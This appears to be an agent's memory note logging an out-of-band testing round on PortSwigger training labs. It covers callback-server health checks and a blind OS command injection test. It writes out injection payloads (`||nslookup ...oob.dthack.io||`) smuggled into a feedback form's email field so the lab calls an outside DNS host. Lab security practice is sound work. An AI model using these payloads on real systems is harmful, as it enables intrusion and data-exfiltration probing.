---
metadata:
  node_type: memory
name: "PRS OOB blocked-lab round b19"
description: "b19 OOB round: pi-rs discriminator green (DoH resolves marker to 47.131.34.33, marker lands in dns.log) but the base HTTP leg :9999 is wedged (saturated accept queue, stuck external connections, loopback probe code=000, no log append); two-leg lab-side discriminator on blind OS command injection = both forced-8.8.8.8 and built-in-resolver legs zero hits, so the \"lab resolver is the trap\" explanation is excluded and the blocked verdict (official Collaborator only) stands; also recorded the range_"
last_updated: 2026-10-07T23:46:37+08:00
created: 2026-10-07T23:46:37+08:00
---

## Batch b19: OOB attack round on the 4 blocked labs - discriminator ran RED, verdicts upheld

Base state (checked live; corrects the alignment doc /tmp/oob-alignment.md's "both legs alive" reading):
- DNS authoritative `dns_oob` pid 48766 alive; a DoH query for a fresh marker returns `47.131.34.33` with `Response from 47.131.34.33`, and the same marker lands in `~/prs-oob/dns.log` within seconds (1 hit) -> DNS leg and its log face are green.
- **HTTP leg :9999 is wedged** (process 49538 alive, service dead): `ss -ltn` shows the accept backlog saturated (`0.0.0.0:9999` Recv-Q 6 / Send-Q 5), three external scanner sources (`194.88.98.93`, `5.226.140.14`, `193.176.31.200`) sit ESTABLISHED forever, and even a **loopback** probe on the base (`curl 127.0.0.1:9999/pi14probe`) returns `code=000` after 5s with no log append. Cause: single-threaded `socketserver.TCPServer` blocked on a connection nobody finished. Fix = restart that python process or switch to `ThreadingTCPServer`; per this round's rules the base was only read, never touched.
- ssh alias `oob-server` works (mesh); `dig` is not installed locally -> use the `dns.google` DoH endpoint as the resolver probe.

Two-leg lab-side discriminator (fresh instance 0a0d005c03fe7268828388d800ab00d8, /web-security/os-command-injection, lab id 6E6E115E...):
- Leg A `x@a.com||nslookup b19a<digits>.oob.dthack.io 8.8.8.8||` (forced external recursion) and leg B `x@a.com||nslookup b19b<digits>.oob.dthack.io||` (built-in resolver) both posted to `/feedback/submit`, both 200 `{}`.
- After 95s: `dns.log` hits **m1=0, m2=0**, `oob-http.log` 0. Preconditions were green (DoH resolution + the same marker appearing in dns.log from our own query).
- Reading: the alternative explanation "the lab's built-in resolver is the trap" is **excluded** - forcing 8.8.8.8 also produces nothing, so the block sits on the lab's outbound path itself. The standing verdict (PortSwigger labs only reach the official Collaborator) is upheld with this new evidence; the lab page's own text states the firewall blocks interactions between the labs and arbitrary external systems.

Tooling notes worth keeping:
- `range_launch` with a jar that does **not** carry the portswigger.net app session does not show the usual Auth0 login redirect: it first surfaced as an Auth0 error page `Global rate limit exceeded`. That "rate limit" was a red herring - the real cause was a missing `cp /tmp/cj1.json <per-instance jar>` step. Copy the jar first, then read errors.
- With the HTTP leg dead, the shellshock/SSRF-callback half of the plan is unrunnable at the base level (its readback is an HTTP hit); the DNS-only labs are blocked at the lab's egress. Neither blockage is an injection-surface problem.

